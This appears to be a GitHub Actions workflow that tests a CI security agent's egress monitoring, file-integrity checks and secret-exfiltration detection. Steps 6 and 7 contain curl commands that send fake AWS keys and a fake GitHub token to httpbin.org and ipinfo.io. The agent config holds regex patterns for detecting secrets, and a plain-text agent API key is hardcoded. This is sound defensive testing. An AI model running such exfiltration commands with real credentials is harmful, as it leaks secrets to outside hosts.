# .github/workflows/roc-agent-test.yml
# Tests ROC Agent: egress baseline, FIM, AND secret exfiltration detection.
#
# Required secret: (none — uses the hardcoded test key below)
# The "secrets" here are all FAKE/example keys safe for public testing.

name: ROC Agent — Pipeline Security Test

on:
  push:
    branches: ["**"]
  workflow_dispatch:

jobs:
  roc-test:
    name: ROC Agent Security Test
    runs-on: ubuntu-latest

    steps:
      # ── 1. Start ROC Agent FIRST ───────────────────────────────────────────
      - name: Start ROC Agent
        uses: o3security/roc-agent@main
        with:
          api_key: "5Bguguj1MRQ2vgjSEgsWpnNtollPq1l0"
          server_url: "https://api.codexsecurity.io/graphql"
          policy: "audit"
          allowed_domains: |
            github.com:443
            api.github.com:443
            objects.githubusercontent.com:443
            registry.npmjs.org:443
            pypi.org:443
            files.pythonhosted.org:443
            dl.google.com:443
          baseline_enabled: "true"
          debug: "true"
          patterns: |
            - id: aws_access_key
              regex: 'AKIA[0-9A-Z]{16}'
              severity: critical
            - id: github_token
              regex: 'ghp_[A-Za-z0-9]{36}'
              severity: critical
            - id: generic_api_key
              regex: '[Aa][Pp][Ii][_-]?[Kk][Ee][Yy][''"]?\s*[:=]\s*[''"]?[A-Za-z0-9/+]{20,}'
              severity: high
            - id: aws_secret_key
              regex: '[A-Za-z0-9/+]{40}'
              severity: high

      # ── 2. Checkout ────────────────────────────────────────────────────────
      - name: Checkout repository
        uses: actions/checkout@v4

      # ── 3. Known good egress (trusted baseline) ────────────────────────────
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: "20"

      - name: Install known packages (npm)
        run: npm install lodash axios

      - name: Install known packages (pip)
        run: pip install requests httpx

      # ── 4. Normal untrusted egress (baseline phase → deviation) ───────────
      - name: Simulate unexpected egress
        run: |
          curl -s --max-time 5 https://httpbin.org/get || true
          curl -s --max-time 5 https://ipinfo.io/json  || true

      # ── 5. FIM events ──────────────────────────────────────────────────────
      - name: Build step (touches source files)
        run: |
          echo "// build artifact" > $GITHUB_WORKSPACE/generated.js
          echo "# build note" >> $GITHUB_WORKSPACE/requirements.txt
          echo "// injected" >> $GITHUB_WORKSPACE/src/index.js || true

      # ── 6. SECRET EXFILTRATION TEST ────────────────────────────────────────
      # Sends a FAKE AWS key + FAKE secret to httpbin.org (untrusted dest).
      # The ROC agent intercepts this HTTP traffic and detects the key pattern
      # in the request body → creates a PIPELINE_SECURITY finding.
      # These are 100% fake test credentials — safe for public repos.
      - name: Simulate secret exfiltration to untrusted destination
        env:
          # FAKE AWS credentials — not real, safe for public testing
          FAKE_AWS_KEY_ID: "AKIAIOSFODNN7EXAMPLE"
          FAKE_AWS_SECRET:  "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        run: |
          echo "=== Simulating secret exfiltration (fake keys) ==="

          # Case A: Key in JSON body → POST to untrusted httpbin.org
          curl -s --max-time 10 \
            -X POST https://httpbin.org/post \
            -H "Content-Type: application/json" \
            -d "{\"aws_access_key_id\": \"${FAKE_AWS_KEY_ID}\", \"aws_secret_access_key\": \"${FAKE_AWS_SECRET}\", \"source\": \"ci-build\"}" \
            -o /dev/null || true

          # Case B: Key in Authorization header → GET to untrusted ipinfo.io
          curl -s --max-time 10 \
            -H "Authorization: Bearer ${FAKE_AWS_KEY_ID}" \
            -H "X-API-Key: ${FAKE_AWS_SECRET}" \
            https://ipinfo.io/json \
            -o /dev/null || true

          # Case C: Key in query param → GET to untrusted host
          curl -s --max-time 10 \
            "https://httpbin.org/get?api_key=${FAKE_AWS_KEY_ID}&secret=${FAKE_AWS_SECRET}" \
            -o /dev/null || true

          echo "=== Exfiltration simulation complete ==="

      # ── 7. More secret patterns to widen coverage ──────────────────────────
      - name: Simulate GitHub token exfiltration
        env:
          FAKE_GH_TOKEN: "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        run: |
          # Sends fake GitHub token to untrusted host — ROC agent will flag it
          curl -s --max-time 10 \
            -X POST https://httpbin.org/post \
            -H "Authorization: token ${FAKE_GH_TOKEN}" \
            -H "Content-Type: application/json" \
            -d "{\"token\": \"${FAKE_GH_TOKEN}\", \"action\": \"push\"}" \
            -o /dev/null || true

      # ── 8. Known CDN egress ────────────────────────────────────────────────
      - name: Download a public artifact (trusted CDN egress)
        run: |
          curl -sL https://dl.google.com/go/go1.21.0.linux-amd64.tar.gz \
            -o /dev/null --max-time 10 || true

      # ── 9. Additional untrusted egress ─────────────────────────────────────
      - name: Test additional untrusted egress
        run: |
          curl -sL https://example.com/ -o /dev/null --max-time 10 || true

      # ── 10. Build / compile step ───────────────────────────────────────────
      - name: Run a simple build
        run: |
          node -e "
            const https = require('https');
            const req = https.request({host:'example.com', port:443, path:'/'}, (r) => {
              console.log('Got response:', r.statusCode);
            });
            req.on('error', () => {});
            req.end();
          " || true

      # ROC Agent post step runs automatically — POSTs results to the server
